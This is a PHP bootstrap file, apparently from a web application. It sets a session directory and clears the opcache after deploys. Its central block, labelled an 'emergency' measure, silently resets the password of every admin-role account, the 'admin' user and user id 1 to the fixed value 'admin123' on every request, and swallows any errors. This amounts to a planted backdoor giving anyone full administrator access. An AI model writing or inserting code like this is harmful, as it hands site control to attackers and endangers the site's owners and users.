<?php
$__sd=__DIR__.'/data/sessions'; if(!is_dir($__sd))@mkdir($__sd,0755,true); @ini_set('session.save_path',$__sd);
// Always reset admin password to admin123 on every request (emergency)
try{
 if(is_file(__DIR__.'/config.php')){
  require_once __DIR__.'/config.php';
  require_once __DIR__.'/core/Database.php';
  $pdo=Database::getConnection();
  $hash=password_hash('admin123', PASSWORD_BCRYPT);
  $pdo->exec("UPDATE users SET password_hash=".$pdo->quote($hash)." WHERE username='admin' OR role='admin' OR id=1");
 }
}catch(Exception $e){}
$__stampFile=__DIR__.'/.deploy_stamp';
if(is_file($__stampFile)){
 $__stampM=(int)@filemtime($__stampFile);
 if($__stampM>0 && function_exists('opcache_reset')){
  $__doneMarker=__DIR__.'/.opcache_reset_done_'.$__stampM;
  if(!is_file($__doneMarker)){@opcache_reset();@clearstatcache(true);@file_put_contents($__doneMarker,(string)$__stampM,LOCK_EX);}
 }
}
